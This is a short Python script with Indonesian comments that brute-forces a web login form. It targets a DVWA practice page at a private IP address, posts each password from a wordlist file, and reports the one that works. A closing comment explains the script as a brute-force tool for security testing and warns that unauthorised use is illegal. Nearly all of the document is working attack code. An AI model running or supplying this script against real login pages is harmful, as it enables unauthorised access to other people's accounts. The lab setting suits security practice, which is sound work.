import requests

# Tentukan halaman web yang ingin Anda retas

# Halaman ini harus merupakan halaman login dengan username dan password

url = "http://10.0.0.139/dvwa/login.php"

username = input("Apa nama pengguna yang ingin Anda coba? ")

# Kemudian, mari kita dapatkan file password

password_file = "wordlist.txt"

# Buka file password dalam mode baca

file = open(password_file, "r")

# Sekarang kita akan mengambil setiap password dalam password_file

for password in file.readlines():

    # Mari kita hilangkan \n

    password = password.strip("\n")

    # Kumpulkan data yang diperlukan dari "inspeksi elemen"

    data = {'username': username, 'password': password, "Login": 'submit'}

    send_data_url = requests.post(url, data=data)

    if "Login failed" in str(send_data_url.content):

        print("[*] Mencoba password: %s" % password)

    else:

        print("[*] Password ditemukan: %s " % password)

# ========================================================================= 
# Kode tersebut merupakan Python yang digunakan untuk melakukan serangan *brute force* terhadap halaman login suatu situs web. 
# Tujuannya adalah untuk mencoba kombinasi berbagai password dari sebuah file teks (disebut `wordlist.txt` dalam kode tersebut) dan mengirimkannya ke halaman login yang ditentukan (dalam hal ini, `http://10.0.0.139/dvwa/login.php`).

# Maksud dari skrip ini adalah untuk menguji keamanan dari halaman login tersebut dengan mencoba berbagai kombinasi password secara otomatis. Jika berhasil, skrip akan mencetak bahwa password berhasil ditemukan bersama dengan password tersebut. Sedangkan jika gagal, skrip akan mencetak bahwa sedang mencoba password tertentu. 

# Namun, perlu diperhatikan bahwa penggunaan skrip semacam ini untuk menguji keamanan suatu sistem tanpa izin dapat dianggap sebagai pelanggaran keamanan dan ilegal. Sebelum melakukan tes keamanan terhadap sistem, pastikan Anda memiliki izin yang sesuai dari pemilik sistem atau administrator jaringan.
